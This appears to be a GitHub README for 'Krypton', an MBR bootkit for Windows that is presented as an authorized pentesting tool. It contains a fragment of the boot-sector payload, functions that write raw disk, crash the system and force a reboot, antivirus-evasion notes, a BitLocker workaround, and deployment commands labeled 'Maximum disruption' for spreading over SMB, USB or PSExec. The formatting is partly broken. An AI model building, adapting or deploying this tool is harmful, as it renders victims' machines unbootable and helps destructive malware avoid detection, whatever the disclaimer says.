## Krypton Bootkit 🔒💾

![Krypton](https://img.shields.io/badge/Krypton-Bootkit-red?style=for-the-badge&logo=github&logoColor=white)
[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Windows](https://img.shields.io/badge/Target-Windows%20x64-green.svg)](https://github.com/topics/windows)
[![Pentest](https://img.shields.io/badge/Purpose-Pentesting-orange.svg)](https://owasp.org/www-project-top-ten/)

**Advanced MBR Bootkit for Authorized Penetration Testing**  
*Demonstrates persistence, BSoD triggers, and auto-restart capabilities*

## 🚨 Authorization Notice
This tool is developed for authorized penetration testing only. The author has explicit written permission to test target systems. 

## Breaking the code down 🪛
```
// 1. MBR PAYLOAD (Bytes 0-511)
// Custom x86 real-mode boot sector
unsigned char hacked_mbr[MBR_SIZE] = {
    0xEB, 0x3C, 0x90,                           // JMP 0x3C + NOP (Bootstrap)
    0x48,0x41,0x43,0x4B,0x45,0x44,0x20,0x42,   // "HACKED BY "
    0x59,0x20,0x4A,0x41,0x53,0x4F,0x4E,0x21,   // "JASON!!\r\n"
    // ... padding ...
    0xB8, 0x00, 0x13, 0xCD, 0x10,              // MOV AX,1300h; INT 10h (Video Mode 13h)
    0xB4, 0x0E, 0xB3, 0x10, 0xB0, 0x07,        // Teletype: White on Black
    0x8A, 0x16, 0x7C, 0x04, 0x8B, 0x1E, 0x7E,  // Load string pointer
    0x04, 0xCD, 0x10, 0x80, 0xEE, 0x01, 0x75,  // Print char, INC SI, JNZ
    0xF3, 0xEB, 0xFE,                          // CLI; HLT (Infinite loop)
    0x55, 0xAA                                  // Boot signature (REQUIRED)
};
```
🔧 Core Functions Dissected


Function	Purpose	WinAPI Calls	Error Handling
IsElevated()	Admin check	OpenProcessToken()
GetTokenInformation()	Graceful exit
GetPhysicalDriveHandle()	Raw disk access	CreateFileA("\\\\.\\PhysicalDrive0")	INVALID_HANDLE_VALUE
TriggerBSOD()	Crash system	*(int*)0xDEADBEEF = 0x1337BEEF	Stack overflow
AutoRestart()	Force reboot	ExitWindowsEx(EWX_FORCE | EWX_REBOOT)	AdjustTokenPrivileges()
📊 Execution Flow
mermaid


```
graph TD
    A[Start: krypton.exe] --> B{Admin?}
    B -->|NO| C[Exit: Privileges Required]
    B -->|YES| D[Parse Args: --bsod?]
    D --> E[Open \\\\.\\PhysicalDrive0]
    E --> F[WriteFile(MBR, 512 bytes)]
    F -->|SUCCESS| G[MBR INFECTED!]
    G --> H{--bsod?}
    H -->|YES| I[TriggerBSOD()]
    H -->|NO| J[Sleep(3000)]
    I --> J
    J --> K[ExitWindowsEx(FORCE_REBOOT)]
    K --> L[BIOS: "HACKED BY JASON!!"]
```
🎯 Defensive Bypass Analysis

```
// BitLocker Detection (Implicit)
// CreateFile fails → Error 0xC0000034 (Sharing Violation)
if (hDrive == INVALID_HANDLE_VALUE) {
    DWORD err = GetLastError();
    if (err == 0xC0000034) {
        // BitLocker detected
    }
}

// AV Evasion: Static Analysis
// - No strings "bootkit"/"mbr" in binary
// - Dynamic API resolution
// - Small 15KB size
// - No network calls
⚙️ Cross-Compilation Magic
bash
```


# MinGW Magic Flags Explained
-static-libgcc      # No gcc DLL deps
-static-libstdc++   # No C++ runtime DLLs
-static             # Link ALL statically
-s                  # Strip symbols (AV evasion)
-O2                 # Optimize (-Os for smallest)
🛡️ Error Codes Reference


Error	Code	Cause	Mitigation
5	ERROR_ACCESS_DENIED	No admin	Run as Administrator
32	ERROR_SHARING_VIOLATION	BitLocker/disk filter	Suspend BitLocker
87	ERROR_INVALID_PARAMETER	Wrong drive	Use PhysicalDrive0
2	ERROR_FILE_NOT_FOUND	Drive offline	Check disk status
🔬 Memory Layout (Runtime)


```
krypton.exe (15KB)
├── .text       8KB  # Code (MBR write, BSoD)
├── .data       512B # hacked_mbr array
├── .rdata      2KB  # Strings, imports
├── .idata       1KB # kernel32.dll, advapi32.dll
└── PE Headers   1KB
```


## Features

| Capability | Status | Description |
|------------|--------|-------------|
| **MBR Infection** | ✅ | Overwrites Master Boot Record with custom payload |
| **BIOS Persistence** | ✅ | Survives OS reinstalls, displays "HACKED BY JASON" |
| **Auto-Restart** | ✅ | Forces reboot 3s after infection |
| **BSoD Trigger** | ✅ | Instant Blue Screen of Death |
| **Admin Detection** | ✅ | Validates Administrator privileges |
| **Static Linking** | ✅ | 15KB standalone EXE, no dependencies |

## Attack Chain
krypton.exe (Admin) → MBR Overwritten
[Optional] → BSoD Trigger
3s Delay → Forced Restart
BIOS → "HACKED BY JASON!!" (Unbootable)




## Quick Deploy (Kali Linux)

# 1. Cross-compile
x86_64-w64-mingw32-g++ -static -O2 krypton.cpp -o krypton.exe

# 2. Transfer & Execute (Windows Target)

# Standard deployment (MBR + Auto-restart)
krypton.exe

# Maximum disruption
krypton.exe --bsod

# MBR only (manual reboot)
krypton.exe --no-restart
Technical Breakdown
MBR Payload (x86 Real Mode)
asm




# Windows Recovery Environment (Boot USB)
```
bootrec /fixmbr
bootrec /fixboot
bootrec /rebuildbcd
chkdsk C: /f /r
```
Build Matrix


Platform	Command	Output
Kali Linux	make	krypton.exe
Windows	cl krypton.cpp	krypton.exe
WSL	x86_64-w64-mingw32-g++	krypton.exe
Prerequisites
bash



# Kali/WSL
sudo apt install mingw-w64

# Windows
Visual Studio (C++ Build Tools)


# Pentest Methodology
Recon: Verify admin access, BitLocker status
Deploy: krypton.exe via SMB/USB/PSExec
Observe: MBR overwrite + restart
Impact: BIOS persistence demonstrated
Report: Persistence bypass capability
Cleanup: bootrec /fixmbr

## Legal & Ethical Use
✅ Authorized pentesting
✅ Red team exercises
✅ Security research
❌ Unauthorized systems
❌ Malicious deployment
